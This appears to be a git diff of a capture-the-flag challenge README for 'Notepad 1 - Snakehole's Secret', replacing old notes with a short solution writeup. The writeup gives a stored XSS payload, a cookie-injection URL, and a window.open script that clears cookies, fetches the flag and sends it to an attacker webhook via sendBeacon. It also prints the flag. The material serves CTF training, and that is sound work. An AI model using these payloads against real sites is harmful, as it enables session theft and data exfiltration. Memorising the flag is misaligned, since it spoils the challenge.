@@ -1,26 +1,30 @@
-Name  : Notepad 1 - Snakehole's Secret
+# Notepad 1 - Snakehole's Secret
 
-Desc  : Janet Snakehole, the rich aristocratic widow with a terrible secret, is being investigated by the FBI's number 1, Burt Tyrannosaurus Macklin. Burt found a website that she visits often. See if you can find anything.  
+### Challenge Description
 
-Deploy: 
-- docker build -t notepad1 . 
-- docker run notepad1
+Janet Snakehole, the rich aristocratic widow with a terrible secret, is being investigated by the FBI's number 1, Burt Tyrannosaurus Macklin. Burt found a website that she visits often. See if you can find anything.  
 
 
-<!-- Payload my end
+### Challenge File
+[Source](./Handout/snakeholesecret.tar.gz)
 
-<img src=x onerror=eval(atob(location.hash.substr(1)))></img>
- -->
-
-<!-- Admin Side : Window.Open to set cookie
-
-http://localhost:3000/find?startsWith=d&debug=y&Set-Cookie=id=f616c83f2f0f188265c7004d81d45723%3B%20path=/get
--->
-
-<!-- Admin Side : Window.Open to xss 
-
-document.cookie="id=47ed733b8d10be225eceba344d533586;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/get;";fetch('/get').then(response=>response.text()).then(data=>console.log(data))
+### MD5 Hash: 
+`fc10f1d03e258b1e697a826541e5b2a1`
 
 
-http://localhost:3000/#document.cookie=%22id=68b329da9893e34099c7d8ad5cb9c940;%20expires=Thu,%2001%20Jan%201970%2000:00:00%20UTC;path=/get;%22;document.cookie=x;fetch('/get').then(response=%3Eresponse.text()).then(data=%3Econsole.log(data));
--->
+### Short Writeup
+
+* Payload in user's note
+    * `<img src/onerror="eval(window.name)">`
+
+* Send a page to admin that does the following
+    * Set-Cookie with your id.
+        * `http://chall.notepad1.gq/find?startsWith=d&debug=y&Set-Cookie=id=f616c83f2f0f188265c7004d81d45723%3B%20path=/get`
+    * Open the page again with the following window.name . Now that your XSS payload gets loaded, remove your cookie and fetch flag.
+        * `window.open("http://chall.notepad1.gq",name="document.cookie='id=f616c83f2f0f188265c7004d81d45723; expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/get;';document.cookie=x;fetch('/get').then(response=>response.text()).then(data=>navigator.sendBeacon('${webhook}',data));")`
+
+### Author
+[Az3z3l](https://twitter.com/Az3z3l)
+
+### Flag
+`inctf{youll_never_take_me_alive_ialmvwoawpwe}`
